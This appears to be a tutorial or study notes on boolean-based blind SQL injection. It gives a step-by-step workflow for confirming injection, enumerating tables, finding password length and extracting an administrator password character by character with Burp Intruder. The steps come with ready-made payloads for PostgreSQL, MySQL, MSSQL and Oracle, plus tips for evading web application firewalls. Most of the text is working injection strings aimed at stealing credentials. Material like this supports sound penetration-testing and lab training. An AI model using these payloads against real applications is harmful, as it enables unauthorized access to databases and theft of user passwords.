# Blind SQL Injection (Boolean-Based) — Full Workflow

---

## What It Is

The app doesn't show query results or errors — but its **behavior changes** based on whether your injected condition is true or false. That behavioral difference (page content, response size, status code, a word appearing/disappearing) is your signal.

You ask the database yes/no questions and read the answer from the response.

---

## Step 1: Confirm Blind Injection

Inject a true and a false condition. Compare responses.

```
' AND '1'='1'--     ← true: normal response
' AND '1'='2'--     ← false: different response
```

**What counts as "different":**
- A word or element appears/disappears (e.g. "Welcome back")
- Response body size changes
- HTTP status code changes (200 vs 302, 200 vs 500)
- A redirect happens or doesn't

> **Real-world note:** The difference can be subtle — a single character in response length. Use Burp Comparer or diff tools to spot it.

---

## Step 2: Confirm Target Data Exists

Verify the table and row you're after actually exist:

```
' AND (SELECT 'x' FROM users WHERE username='administrator')='x'--
```

Normal (true) response = row exists.

> **IRL:** You won't know table/column names upfront. Use `information_schema.tables` and `information_schema.columns` to enumerate first (see extraction chains below).

---

## Step 3: Enumerate Tables and Columns

Before extracting data, find what's in the database.

**Check if a table exists:**
```
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users')>0--
```

**Check if a column exists:**
```
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name='password')>0--
```

> **Oracle:** Use `all_tables` and `all_tab_columns` instead. Table names are UPPERCASE.
> **SQLite:** Use `sqlite_master` — `' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='users')>0--`

---

## Step 4: Determine Password Length

Binary search to find the length efficiently:

```
' AND (SELECT 'x' FROM users WHERE username='administrator' AND LENGTH(password)>10)='x'--
' AND (SELECT 'x' FROM users WHERE username='administrator' AND LENGTH(password)>20)='x'--
' AND (SELECT 'x' FROM users WHERE username='administrator' AND LENGTH(password)>15)='x'--
```

Narrow down until you find the exact length. Binary search cuts this to ~5-6 requests instead of 30+.

> **MSSQL:** Use `LEN()` instead of `LENGTH()`.
> **Oracle:** `LENGTH()` works.

---

## Step 5: Extract Data Character by Character

### Method A — Character comparison (simpler, more requests)

```
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
```

Cycle through `a-z`, `0-9`, special chars for each position.

> **Oracle:** Use `SUBSTR()` instead of `SUBSTRING()`.

### Method B — ASCII comparison (faster with binary search)

```
' AND ASCII(SUBSTRING(password,§pos§,1))>§ascii§--
```

Binary search the ASCII value: test `>64`, then `>96` or `>32`, etc. Cuts per-character requests from ~36 to ~7.

---

## Step 6: Automate with Burp Intruder

**Attack type:** Cluster Bomb

**Payload positions:**
```
' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§'--
```

- **Payload 1 (position):** Numbers 1 to password length
- **Payload 2 (character):** a-z, 0-9 (expand if needed: A-Z, special chars)

**Filtering results:**
- **Grep match:** Set a grep match string for the TRUE response indicator (e.g. "Welcome back")
- **Response length:** TRUE and FALSE responses will have different lengths — filter by the TRUE length

---

## Step 7: Reconstruct the Password

Export Intruder results → filter for TRUE matches → sort by position → read characters in order → full password.

---

## DB-Specific Extraction Chains

### PostgreSQL
```
' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
```

### MySQL
```
' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
```

### MSSQL
```
' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LEN(password)>1)='a'--
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
```

### Oracle
```
' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--
' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='administrator')='a'--
```

---

## Cookie / URL Injection Notes

When injecting into cookies or URL parameters, encode special characters:

| Char | Encoded |
|------|---------|
| `;`  | `%3B`   |
| `=`  | `%3D`   |
| `'`  | `%27`   |
| ` `  | `%20`   |

---

## Real-World Tips

- **Finding the signal:** Automate response comparison — don't eyeball it. Use Burp Comparer or write a script that flags response length differences.
- **Speed:** Boolean-based is faster than time-based (no delays), but slower than error-based or UNION (one bit per request vs full strings).
- **WAF evasion:** If `AND` is blocked, try `&&`, inline comments (`AN/**/D`), or case variation.
- **Charset optimization:** Start with lowercase + digits (36 chars). Only expand to uppercase/special if you get gaps.
- **Table/column enumeration:** In real targets, always enumerate via `information_schema` first — don't guess.

---

The mindset: no output → use behavior → ask true/false → extract bit by bit.
